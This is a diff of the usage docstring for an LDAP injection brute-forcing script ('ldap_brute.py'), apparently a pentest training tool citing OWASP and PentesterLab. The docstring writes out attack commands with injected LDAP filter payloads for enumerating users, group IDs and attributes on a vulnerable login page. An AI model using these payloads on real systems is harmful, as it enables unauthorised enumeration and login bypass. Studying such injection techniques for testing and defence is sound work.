@@ -1,34 +1,31 @@
 """
-Example:
+Usage:
+    python ldap_brute.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'
 
-python ldap_brute.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'
+    In this example, we inserted an expression into the param that will always
+    return true if the parameter replaced by %s is true, in this case ennumerating
+    all valid users. Your mission is to get an LDAP that will return TRUE-STRING
+    when %s is TRUE, and will not return it when FALSE.
 
-In this example, we inserted an expression into the param that will always
-return true if the parameter replaced by %s is true, in this case ennumerating
-all valid users. Your mission is to get an LDAP that will return TRUE-STRING
-when %s is TRUE, and will not return it when FALSE.
-
-Strings inserted look like 'a*', 'b*', 'c*'
+    Strings inserted look like 'a*', 'b*', 'c*'
 
 Non-wildcard example:
+    python ldap_brute.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
-python ldap_brute.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+    Some LDAP attributes do not support wildcards, in which case you should use
+    --no-wildcard. In this example, note how the %s needs to be placed right at the
+    end of an always-true filter and its respective close parenthesis.
 
-Some LDAP attributes do not support wildcards, in which case you should use
---no-wildcard. In this example, note how the %s needs to be placed right at the
-end of an always-true filter and its respective close parenthesis.
-
-Strings inserted look like
-"(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
-(trimmed for brevity)
+    Strings inserted look like
+    "(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
+    (trimmed for brevity)
 
 Bruteforcing attributes:
+    python ldap_brute.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
-python ldap_brute.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
-
-Recommend only using -c 'lower', since using digits can cause invalid
-attributes (like '9c') to be mixed with valid attributes, which is not handled
-properly at all.
+    Recommend only using -c 'lower', since using digits can cause invalid
+    attributes (like '9c') to be mixed with valid attributes, which is not handled
+    properly at all.
 
 NOTE: Remember to quote the URL because bash! And also remember that % needs to
 be escaped as %%, because python/printf.
@@ -42,6 +39,7 @@ Plase see for more info:
 
 https://code.google.com/p/ldap-blind-explorer/
 https://www.owasp.org/index.php/LDAP_injection
+http://tools.ietf.org/html/rfc4519
 http://web-for-pentester.pentesterlab.com/examples_of_web_vulnerabilities/ldap_attacks/
 http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
 http://www.ietf.org/rfc/rfc1960.txt
@@ -151,7 +149,7 @@ def main(args, output=True):
         succ(valid_values)
 
 if __name__ == '__main__':
-    parser = common.parser_get()
+    parser = common.parser_get(__doc__)
     args = parser.parse_args()
 
     common.logging_set(args.verbosity)
